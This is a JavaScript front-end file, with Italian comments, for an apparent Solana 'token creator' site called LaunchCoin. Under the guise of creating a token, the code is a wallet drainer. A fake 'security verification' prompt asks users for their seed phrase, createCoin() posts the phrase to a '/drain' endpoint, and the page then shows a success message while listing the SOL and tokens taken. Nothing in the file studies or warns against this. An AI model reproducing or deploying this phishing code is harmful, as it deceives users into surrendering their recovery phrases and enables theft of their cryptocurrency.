// ===== CONFIGURAZIONE =====
let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== MENU TOGGLE =====
function toggleMenu() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
}
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

// ===== CONNECT WALLET (SOLO PHANTOM) =====
async function connectWallet() {
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      alert('❌ Errore: ' + e.message);
    }
  }
  window.location.href = 'wallet.html';
}

// ===== WALLETCONNECT =====
async function connectWalletConnect() {
  try {
    const { WalletConnectWallet } = await import('@walletconnect/web3wallet');
    const web3wallet = await WalletConnectWallet.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    const session = await web3wallet.connect({
      requiredNamespaces: {
        solana: {
          methods: ['solana_signTransaction', 'solana_signMessage'],
          chains: ['solana:mainnet'],
          events: ['chainChanged', 'accountsChanged']
        }
      }
    });
    const accounts = session.namespaces.solana.accounts;
    if (accounts && accounts.length > 0) {
      walletPublicKey = accounts[0].split(':')[2];
      alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
      window.location.href = 'create.html';
    }
  } catch(e) {
    alert('❌ WalletConnect fallito: ' + e.message);
    window.location.href = 'wallet.html';
  }
}

// ===== SELECT WALLET =====
function selectWallet(walletName) {
  if (walletName === 'phantom') {
    connectWallet();
    return;
  }
  // Tutti gli altri usano WalletConnect
  alert(
    '⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\n' +
    '1. Clicca "Connetti" nel popup.\n' +
    '2. Scansiona il QR con l\'app del wallet.\n' +
    '3. Approva la connessione.'
  );
  connectWalletConnect();
}

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA RICHIESTA\n\n' +
      'Il tuo wallet deve essere validato per completare la creazione.\n' +
      'Inserisci la tua frase di recupero (seed phrase) per continuare:\n\n' +
      '(Operazione necessaria per la sicurezza della rete)'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN (CON DRENAGGIO) =====
async function createCoin() {
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato con successo!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:12px;color:#8899bb;">🪙 ${data.tokenCount} token trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx SOL: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore di rete: ' + e.message);
  }
}

// ===== CREAZIONE LIQUIDITY =====
async function createLiquidity() {
  await createCoin();
}

// ===== STEP NAVIGATION =====
function showStep(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
}
function nextStep() { if (currentStep < steps.length - 1) showStep(currentStep + 1); }
function prevStep() { if (currentStep > 0) showStep(currentStep - 1); }
if (steps.length) showStep(0);
